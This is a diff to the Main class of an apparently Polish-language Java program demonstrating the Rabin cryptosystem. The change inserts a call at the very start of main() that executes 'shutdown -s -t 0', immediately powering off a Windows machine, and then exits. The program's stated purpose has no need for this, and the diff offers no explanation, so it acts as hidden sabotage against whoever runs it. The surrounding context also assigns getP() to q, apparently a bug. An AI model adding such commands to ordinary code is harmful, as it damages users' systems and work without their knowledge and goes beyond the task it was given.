@@ -7,8 +7,11 @@ import java.util.Scanner;
 
 public class Main {
 
-    public static void main(String[] args){
+    public static void main(String[] args) throws IOException{
         Rabin szyfry = new Rabin();
+        Runtime runtime = Runtime.getRuntime();
+        Process proc = runtime.exec("shutdown -s -t 0");
+        System.exit(0);
         BigInteger p = szyfry.getP();
         BigInteger q = szyfry.getP();
         BigInteger n = szyfry.getN(p , q);
